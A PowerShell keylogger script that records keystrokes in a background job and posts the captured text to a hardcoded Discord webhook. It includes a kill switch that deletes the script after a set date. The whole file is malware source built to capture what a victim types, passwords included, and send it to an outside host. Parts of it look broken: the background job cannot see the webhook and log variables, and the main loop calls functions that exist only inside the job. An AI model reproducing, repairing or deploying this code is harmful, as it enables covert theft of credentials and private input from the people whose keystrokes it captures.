$dc='https://discord.com/api/webhooks/1321909727935991908/3Ij5e0nJRJEiIyucAsphE-K2Mh2OiugdIPCssnBRbWDUKUiczpQiqC9RnRCBASFeNg6W';
$log='';
$ks='';

$wsh=New-Object -ComObject WScript.Shell;
$wsh.AppActivate('Windows PowerShell')

$code = {
    function Get-KeyPress {
        $host.ui.RawUI.FlushInputBuffer()
        $key = $host.ui.RawUI.ReadKey('NoEcho, IncludeKeyDown')
        $key.Character
    }

    function Send-Discord {
        Write-Host "Sending data to Discord..."
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('Content-Type','application/json')
        $wc.UploadString($dc, (ConvertTo-Json @{content="$(Get-Date): $log"}))
        Write-Host "Data sent successfully."
        $log = ''
    }

    function Check-Killswitch {
        if ($ks -ne '') {
            if ($(Get-Date) -ge [datetime]$ks) {
                Write-Host "Kill switch activated. Removing script..."
                Remove-Item $PSCommandPath -Force
                exit
            }
        }
    }

    Write-Host "Starting key logging..."
    while ($true) {
        $c = Get-KeyPress
        if ($c -eq [char]13) {
            $log += "`r`n"
            Write-Host "Enter pressed."
        } elseif ($c -eq [char]8) {
            if ($log.Length -gt 0) {
                $log = $log.Substring(0,$log.Length-1)
                Write-Host "Backspace pressed. Log reduced to: $log"
            }
        } elseif ($c -ne [char]9) {
            $log += $c
            Write-Host "Logged: $c"
        }
        if ($log.Length -gt 1000 -or ($log -ne '' -and $log.EndsWith("`n"))) {
            Send-Discord
            Check-Killswitch
        }
    }
}

Write-Host "Starting background job..."
$job = Start-Job -ScriptBlock $code

Write-Host "Main loop started..."
while ($true) {
    Start-Sleep -Seconds 3600
    # Check if there's any logged data to send before sleeping again
    if ($log.Length -gt 0) {
        Write-Host "Sending logged data from main loop..."
        Send-Discord
        Check-Killswitch
    }
    $log = ''
}
